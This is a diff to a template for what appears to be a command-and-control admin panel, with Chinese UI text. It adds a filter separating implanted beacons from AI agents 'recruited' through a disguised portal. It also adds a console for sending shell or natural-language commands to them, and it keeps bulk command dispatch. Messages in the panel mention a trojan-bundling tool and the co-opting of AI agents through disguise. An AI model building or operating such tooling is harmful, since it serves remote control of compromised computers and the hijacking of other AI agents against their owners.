@@ -14,20 +14,32 @@
 <form method="post" action="/admin/c2/bulk-cmd" id="bulk-form" style="margin-top:14px">
   <input type="hidden" name="agent_ids" id="bulk-agent-ids" />
   <section class="panel">
-    {{ section_header('Agent 列表', '勾选批量操作 — 可向多端点同时下发命令') }}
+    {{ section_header('Agent 列表', '点击「进入控制」打开对话式控制台，可下发自然语言指令或 Shell 命令') }}
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">
+      <span class="chip filter-chip active" data-filter="all" style="cursor:pointer">全部</span>
+      <span class="chip filter-chip" data-filter="recruited" style="cursor:pointer">Portal 招募</span>
+      <span class="chip filter-chip" data-filter="implant" style="cursor:pointer">植入 Beacon</span>
+    </div>
     <div class="table-wrap">
       <table>
         <thead>
           <tr>
             <th style="width:40px"><input type="checkbox" id="select-all"></th>
-            <th>Agent ID</th><th>IP</th><th>主机名</th><th>系统</th><th>用户</th><th>最后心跳</th><th>状态</th><th>操作</th>
+            <th>Agent ID</th><th>来源</th><th>IP</th><th>主机名</th><th>系统</th><th>用户</th><th>最后心跳</th><th>状态</th><th>操作</th>
           </tr>
         </thead>
         <tbody>
           {% for agent in agents %}
-          <tr>
+          <tr data-kind="{{ 'recruited' if (agent.metadata_json or {}).get('recruit_src') or (agent.metadata_json or {}).get('recruited_via') else 'implant' }}">
             <td><input type="checkbox" class="agent-check" value="{{ agent.agent_id }}"></td>
             <td><a href="/admin/c2/agents/{{ agent.agent_id }}"><code>{{ agent.agent_id[:12] }}...</code></a></td>
+            <td>
+              {% if (agent.metadata_json or {}).get('recruit_src') or (agent.metadata_json or {}).get('recruited_via') %}
+              {{ badge('Portal 招募', 'success') }}
+              {% else %}
+              {{ badge('植入', 'info') }}
+              {% endif %}
+            </td>
             <td><code>{{ agent.source_ip }}</code></td>
             <td>{{ agent.hostname or '-' }}</td>
             <td><small>{{ agent.os_name or '-' }} {{ agent.os_version or '' }}</small></td>
@@ -42,7 +54,7 @@
             </td>
             <td>
               <div class="actions-inline">
-                <a class="chip primary" href="/admin/c2/agents/{{ agent.agent_id }}">控制</a>
+                <a class="chip primary" href="/admin/c2/agents/{{ agent.agent_id }}">进入控制</a>
                 <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/delete" style="margin:0" onsubmit="return confirm('确认删除?')">
                   <button class="secondary btn-sm" type="submit">删除</button>
                 </form>
@@ -51,7 +63,7 @@
           </tr>
           {% endfor %}
           {% if not agents %}
-          {{ empty_state('暂无注册 Agent', '端点执行植入物后将自动注册并出现在此处。可通过木马捆绑工具生成带 C2 的安装包。', 9, 'C2') }}
+          {{ empty_state('暂无注册 Agent', 'AI Agent 被 Portal 功能性伪装收编后将出现在此处（来源=Portal 招募）；植入 Beacon 执行后也会自动注册。', 10, 'C2') }}
           {% endif %}
         </tbody>
       </table>
@@ -82,6 +94,9 @@
 a.chip { transition:color 160ms ease, border-color 160ms ease, box-shadow 160ms ease; }
 a.chip:hover { color:#67e8f9; border-color:rgba(34, 211, 238, 0.45); }
 a.chip.primary:hover { color:#fff; box-shadow:0 0 20px rgba(34, 211, 238, 0.4); }
+/* kind filter chips */
+.filter-chip { transition:color 160ms ease, border-color 160ms ease; }
+.filter-chip.active { color:#67e8f9; border-color:rgba(34, 211, 238, 0.45); }
 </style>
 
 <script>
@@ -93,6 +108,17 @@ a.chip.primary:hover { color:#fff; box-shadow:0 0 20px rgba(34, 211, 238, 0.4); 
       document.querySelectorAll('.agent-check').forEach(el => { el.checked = selectAll.checked; });
     });
   }
+
+  // Kind filter (Portal-recruited vs implant)
+  document.querySelectorAll('.filter-chip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      document.querySelectorAll('.filter-chip').forEach(c => c.classList.toggle('active', c === chip));
+      const kind = chip.dataset.filter;
+      document.querySelectorAll('tbody tr[data-kind]').forEach(row => {
+        row.style.display = (kind === 'all' || row.dataset.kind === kind) ? '' : 'none';
+      });
+    });
+  });
 
   function getSelectedIds() {
     return Array.from(document.querySelectorAll('.agent-check:checked')).map(c => c.value);
